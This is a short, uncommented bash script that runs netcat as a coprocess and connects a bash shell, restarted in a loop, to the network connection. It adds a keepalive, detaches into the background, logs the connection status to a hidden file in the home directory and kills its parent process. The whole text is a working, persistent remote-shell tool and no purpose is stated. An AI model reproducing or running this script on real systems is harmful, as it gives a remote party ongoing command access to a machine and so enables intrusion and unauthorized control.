( 
  (
    coproc nc "$@"
    C=(${COPROC_PID} ${COPROC[@]})
    coproc {
      while true; do
        bash
        S=$?
        if [ "$S" ]; then
          echo "shell return status $S"
          echo "restart shell..."
        fi
      done
    } <&${C[1]} >&${C[2]}
    coproc {
      while sleep 5; do
        echo
      done
    } >&${C[2]}
    wait ${C}
    F="${HOME}/.connect.$(date +%Y%m%d-%H%M%S).log"
    echo "connect return status $?" >>"$F"
    kill -SIGKILL +$$
  ) &
)
